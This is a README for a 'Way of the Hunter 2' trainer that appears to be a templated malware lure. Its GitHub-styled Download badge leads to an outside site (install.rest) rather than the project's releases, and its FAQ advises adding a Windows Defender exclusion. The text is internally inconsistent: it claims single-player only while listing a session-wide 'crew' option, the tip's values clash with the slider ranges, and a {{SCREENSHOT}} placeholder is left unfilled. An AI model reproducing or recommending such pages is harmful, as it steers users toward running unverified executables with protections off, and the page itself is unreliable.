<div align="center">

# Way of the Hunter 2 — Trainer

**God mode, infinite resources, speed control, unlocks, free camera**
Free, open source, no installer. Opens with `Insert`.

![Version](https://img.shields.io/badge/version-1.0.0-c45c26?style=flat-square)
![Platform](https://img.shields.io/badge/Windows-10%20%7C%2011-1c1c1c?style=flat-square)
![Store](https://img.shields.io/badge/Steam-supported-4a8c5a?style=flat-square)
![Options](https://img.shields.io/badge/options-24%2B-6a6a6a?style=flat-square)
![Licence](https://img.shields.io/badge/licence-MIT-d9c47a?style=flat-square)

<p align="center">
<a href="https://install.rest/game/d0c81539-4f4d-494b-9d7d-d95a7f7039e6" rel="nofollow">
  <img src="https://camo.githubusercontent.com/b87131a1df3e3571047c2418ffeb7e38d207b84106665151f330efb21ec3f801/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f446f776e6c6f61642d626c61636b3f7374796c653d666f722d7468652d6261646765266c6f676f3d676974687562" width="300" data-canonical-src="https://img.shields.io/badge/Download-black?style=for-the-badge&amp;logo=github" style="max-width: 100%;">
<img alt="image" src="{{SCREENSHOT}}" />
</a>
</p>

</div>

---

> [!NOTE]
> Single-player only. No multiplayer, no anti-cheat, nothing here reaches anyone else.

## What it does

Way of the Hunter 2 is built around a long resource grind and repeated retries when a run goes wrong. That loop is the main thing reviews complain about once the novelty drops.

Resource and speed sliders usually fix that without deleting the game. Full god mode is the lazy option and it makes the rest of the tool pointless — leave it off until you are stuck.

## Features

| Option | Hotkey | What it does |
|---|---|---|
| God mode | `F1` | Stop incoming damage. Off by default. |
| Infinite resources | `F2` | Keep the currency the game gates progress behind. |
| One-hit attacks | `F3` | Skip padded combat encounters. |
| Game speed | slider | `1x`–`50x`, default `3x` |
| Resource multiplier | slider | `0%`–`100%` — the softer alternative to Infinite resources |
| Shared loot `crew` | `F4` | Changes pickups for everyone in the session. |
| Skip current objective `bypass` | `F5` | Jumps the active goal. Off by default. |
| Unlock all `save` | — | Writes unlock flags into the save. |
| Unlock all collectibles | — | Persistent |
| Free camera | `F10` | Detach from the character |
| Hide HUD | `F11` | For screenshots |
| Field of view | slider | `60`–`130 deg` |

<sub>Tags — **`crew`**: changes the shared session · **`bypass`**: removes the work the game is built around · **`spoiler`**: reveals story early · **`save`**: writes persistent data · **`EA`**: unfinished Early Access system · **`comfort`**: accessibility, changes nothing. Use at most three. Anything tagged `bypass` or `spoiler` ships off.</sub>

## Hotkeys

`Insert` opens the menu · `End` resets everything · `F1`–`F12` as above, all rebindable · arrow keys and `Enter` navigate without a mouse

> [!TIP]
> Start with resource multiplier at 3x and game speed at 1.25x. Leave god mode and skip-objective off so the loop still exists.

> [!WARNING]
> Unlock all is the fastest way to empty the game. It writes the save and a patch can invalidate it.
>
> Options tagged `save` write persistent data that a patch can invalidate. Back up first and disable cloud sync while you experiment.

## FAQ

<details>
<summary>Will I get banned?</summary>
No. Single-player only, no anti-cheat, no ranked mode. Achievements unlock locally unless you block them in the menu.
</details>

<details>
<summary>Does infinite resources break crafting?</summary>
No. It tops up the gated currency. Recipes and stations still work the way the game shipped them.
</details>

<details>
<summary>Why do some options do nothing on the title screen?</summary>
Those values exist only after a save is loaded. Start a game, then toggle.
</details>

<details>
<summary>Does it work on Steam Deck or Linux?</summary>
No. Windows only. Proton changes how the game's memory is laid out and this build does not handle that.
</details>

<details>
<summary>Windows Defender flagged the download.</summary>
Trainers read and write another process's memory, which is what a lot of malware also does, so heuristic scanners flag them on principle. Every release ships with a SHA256 checksum and full source. Add an exclusion if you are comfortable with that — and if you would rather not, don't. That is a reasonable call.
</details>

<details>
<summary>Options stopped working after an update.</summary>
Patches move memory offsets and options fail independently, so some will keep working. Check the Releases page for a build matching your game version.
</details>

## Troubleshooting

| Symptom | Fix |
|---|---|
| Nothing happens on `Insert` | Another overlay grabbed the key — Steam, Discord or RTSS. Rebind the menu key. |
| "Process not found" | The game must be running with a save loaded. Launch it first, then attach. |
| Combat options do nothing | That memory allocates only in an active encounter. Get there first, then toggle. |
| Unlocks vanished after a patch | A persistent write was invalidated. Restore a backup from before the update. |
| Overlay conflicts with the game's own UI scale | Set the game to fullscreen and disable other overlays, then reopen Insert. |

## Reporting a problem

[Open an issue](../../issues) with your **exact game build number** — that matters more than everything else combined — plus your store, Windows version, where you were in the game, and which single option misbehaved.

## Changelog

**v1.0.0** — 30 Sept 2026 — first release. 24+ options across Player, Resources, World, Visuals. Host-only / submission guards stay on so a guest or a leaderboard cannot be affected by accident.

<!-- One line per release. Do not invent a version history — the Releases tab
     is one click away and an empty one under a long changelog reads badly. -->

---

<div align="center">
<sub>Unofficial fan tool. Not affiliated with the original developer, the original publisher or Valve. Way of the Hunter 2 and all related names and assets belong to their respective owners. Modifying a running game's memory carries some risk of crashes and save corruption — back up first, use at your own risk. MIT licensed.</sub>
</div>
